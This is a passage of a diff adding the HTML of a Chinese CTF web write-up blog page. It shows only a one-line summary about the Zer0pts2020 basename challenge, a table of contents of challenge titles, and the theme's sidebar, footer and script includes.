+<h3 id="总结-20"><a href="#总结-20" class="headerlink" title="总结"></a>总结</h3><p>这道题还是信息检索能力太差了。而且google搜basename没搜到问题，大概是因为自己太不会用搜索引擎了。</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/ctf/" rel="tag"># ctf</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/03/23/BJDCTF-2nd-web/" rel="next" title="BJDCTF-2nd-web">
+                <i class="fa fa-chevron-left"></i> BJDCTF-2nd-web
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/11/11/2020-hackergame/" rel="prev" title="2020_hackergame">
+                2020_hackergame <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="https://i.loli.net/2019/11/10/UuWBRD8EjChrNIi.jpg"
+                alt="irrik" />
+            
+              <p class="site-author-name" itemprop="name">irrik</p>
+              <p class="site-description motion-element" itemprop="description">又菜又爱玩</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/%7C%7C%20archive">
+              
+                  <span class="site-state-item-count">25</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">8</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/irrik" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-globe"></i>GitHub</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#GXYCTF2019-BabyUpload"><span class="nav-number">1.</span> <span class="nav-text">[GXYCTF2019]BabyUpload</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#总结"><span class="nav-number">1.1.</span> <span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#FBCTF2019-RCEService"><span class="nav-number">2.</span> <span class="nav-text">[FBCTF2019]RCEService</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#总结-1"><span class="nav-number">2.1.</span> <span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#BSidesCF-2020-Had-a-bad-day"><span class="nav-number">3.</span> <span class="nav-text">[BSidesCF 2020]Had a bad day</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#总结-2"><span class="nav-number">3.1.</span> <span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#RCTF2015-EasySQL"><span class="nav-number">4.</span> <span class="nav-text">[RCTF2015]EasySQL</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#总结-3"><span class="nav-number">4.1.</span> <span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MRCTF2020-套娃"><span class="nav-number">5.</span> <span class="nav-text">[MRCTF2020]套娃</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#总结-4"><span class="nav-number">5.1.</span> <span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WUSTCTF2020-颜值成绩查询"><span class="nav-number">6.</span> <span class="nav-text">[WUSTCTF2020]颜值成绩查询</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#总结-5"><span class="nav-number">6.1.</span> <span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#RoarCTF-2019-Simple-Upload"><span class="nav-number">7.</span> <span class="nav-text">[RoarCTF 2019]Simple Upload</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#总结-6"><span class="nav-number">7.1.</span> <span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WUSTCTF2020-朴实无华"><span class="nav-number">8.</span> <span class="nav-text">[WUSTCTF2020]朴实无华</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#总结-7"><span class="nav-number">8.1.</span> <span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#极客大挑战-2019-FinalSQL"><span class="nav-number">9.</span> <span class="nav-text">[极客大挑战 2019]FinalSQL</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#总结-8"><span class="nav-number">9.1.</span> <span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#V-amp-N2020-公开赛-TimeTravel"><span class="nav-number">10.</span> <span class="nav-text">[V&amp;N2020 公开赛]TimeTravel</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#总结-9"><span class="nav-number">10.1.</span> <span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HFCTF2020-EasyLogin"><span class="nav-number">11.</span> <span class="nav-text">[HFCTF2020]EasyLogin</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#总结-10"><span class="nav-number">11.1.</span> <span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SUCTF-2019-EasyWeb"><span class="nav-number">12.</span> <span class="nav-text">[SUCTF 2019]EasyWeb</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#总结-11"><span class="nav-number">12.1.</span> <span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CISCN2019-华东南赛区-Web11"><span class="nav-number">13.</span> <span class="nav-text">[CISCN2019 华东南赛区]Web11</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#总结-12"><span class="nav-number">13.1.</span> <span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#GYCTF2020-FlaskApp"><span class="nav-number">14.</span> <span class="nav-text">[GYCTF2020]FlaskApp</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#总结-13"><span class="nav-number">14.1.</span> <span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#GYCTF2020-Ezsqli"><span class="nav-number">15.</span> <span class="nav-text">[GYCTF2020]Ezsqli</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#总结-14"><span class="nav-number">15.1.</span> <span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#watevrCTF-2019-Pickle-Store"><span class="nav-number">16.</span> <span class="nav-text">[watevrCTF-2019]Pickle Store</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#总结-15"><span class="nav-number">16.1.</span> <span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#RootersCTF2019-babyWeb"><span class="nav-number">17.</span> <span class="nav-text">[RootersCTF2019]babyWeb</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#总结-16"><span class="nav-number">17.1.</span> <span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#NPUCTF2020-ReadlezPHP"><span class="nav-number">18.</span> <span class="nav-text">[NPUCTF2020]ReadlezPHP</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#总结-17"><span class="nav-number">18.1.</span> <span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MRCTF2020-Ezpop"><span class="nav-number">19.</span> <span class="nav-text">[MRCTF2020]Ezpop</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#总结-18"><span class="nav-number">19.1.</span> <span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#安恒4月月赛web1"><span class="nav-number">20.</span> <span class="nav-text">安恒4月月赛web1</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#总结-19"><span class="nav-number">20.1.</span> <span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#GXYCTF2019-StrongestMind"><span class="nav-number">21.</span> <span class="nav-text">[GXYCTF2019]StrongestMind</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Zer0pts2020-Can-you-guess-it"><span class="nav-number">22.</span> <span class="nav-text">[Zer0pts2020]Can you guess it?</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#总结-20"><span class="nav-number">22.1.</span> <span class="nav-text">总结</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">irrik</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count">112.3k</span>
+  
+</div>
+
+
+  <div class="powered-by">
+	<i class="fa fa-user-md"></i>
+	<span id="busuanzi_container_site_uv">
+		本站访客数:<span id="busuanzi_value_site_uv"></span>
+	</span>
+	<span class="post-meta-divider">|</span>
+	<span id="busuanzi_container_site_pv">
+		本站访问量<span id="busuanzi_value_site_pv"></span>
+	</span>
+</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
